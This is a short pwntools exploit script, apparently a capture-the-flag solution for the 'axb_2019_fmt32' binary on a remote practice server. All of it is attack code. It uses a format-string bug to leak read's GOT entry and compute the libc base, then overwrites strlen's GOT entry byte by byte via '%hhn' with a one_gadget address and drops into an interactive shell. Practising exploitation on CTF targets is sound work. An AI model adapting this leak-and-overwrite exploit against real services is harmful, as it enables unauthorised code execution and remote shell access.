from pwn import *

context(os = 'linux', arch = 'i386', log_level = 'debug')
# io = process('axb_2019_fmt32')
io = remote('node4.buuoj.cn', 27750)
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
elf = ELF('axb_2019_fmt32')
strlen_got = elf.got['strlen']
read_got = elf.got['read']

payload = b'a' + p32(read_got) + b'%8$s'
io.sendlineafter('Please tell me:', payload)
io.recvuntil(b'a' + p32(read_got))
libc_base = u32(io.recvn(4)) - libc.symbols['read']
log.success('libc_base: ' + hex(libc_base))

# one_gadget = libc_base + 0x3ac6c	# for local
one_gadget = libc_base + 0x3a80c
log.success('one_gadget: ' + hex(one_gadget))

payload = b'a' + p32(strlen_got) + p32(strlen_got + 1) + p32(strlen_got + 2)
cur_len = 13 + 9 		# Repeater:
for i in range(3):
	target_len = (one_gadget & (0xff << (i * 8))) >> (i * 8)
	if target_len <= cur_len:
		payload += b'%' + str.encode(str(target_len + 0x100 - cur_len)) + b'c'
	else:
		payload += b'%' + str.encode(str(target_len - cur_len)) + b'c'
	payload += b'%' + str.encode(str(8 + i)) + b'$hhn'
	cur_len = target_len

io.sendlineafter('Please tell me:', payload)
io.sendlineafter('Please tell me:', 'a')
io.interactive()

